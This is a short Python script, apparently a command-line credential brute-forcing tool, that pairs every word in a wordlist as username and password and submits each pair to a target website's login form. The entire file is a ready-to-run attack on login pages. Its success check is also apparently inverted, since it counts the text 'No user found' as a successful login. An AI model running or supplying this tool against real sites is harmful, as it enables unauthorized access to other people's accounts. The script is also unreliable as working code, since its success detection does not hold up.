import requests
import argparse

def brute_force(username, password, target_url, http_method):
    session = requests.Session()
    login_data = {
        "Username": username,
        "password": password,
    }

    if http_method.lower() == "post":
        response = session.post(target_url, data=login_data)
    elif http_method.lower() == "get":
        response = session.get(target_url, params=login_data)
    else:
        print("Invalid HTTP method. Please use 'get' or 'post'.")
        return

    status_code = response.status_code
    
    

    success_indicator = "No user found"
    if success_indicator in response.text:
        print(f"Successful login: {username} / {password}")
    else:
        print(f"Failed login: {username} / {password}")

    session.close()

def display_help():
    print("Usage:")
    print("python brute.py -t targetsite -m get/post -w wordlist.txt")
    print("\nOptions:")
    print("-t, --target     Target website URL")
    print("-m, --method     HTTP method for login request (default: post)")
    print("                 Choices: get, post")
    print("-w, --wordlist   Path to the wordlist file for usernames and passwords")
    print("\nExample:")
    print("python brute.py -t http://target.com -m post -w wordlist.txt")

def main():
    parser = argparse.ArgumentParser(description="Simple brute-force tool")
    parser.add_argument("-t", "--target", required=True, help="Target website URL")
    parser.add_argument("-m", "--method", choices=["get", "post"], default="post", help="HTTP method for login request (default: post)")
    parser.add_argument("-w", "--wordlist", required=True, help="Path to the wordlist file for usernames and passwords")

    args = parser.parse_args()

    if args.target.lower() == "help" or args.method.lower() == "help" or args.wordlist.lower() == "help":
        display_help()
        return

    with open(args.wordlist, "r") as file:
        words = file.read().splitlines()

    for username in words:
        for password in words:
            brute_force(username, password, args.target, args.method)

    

if __name__ == "__main__":
    main()
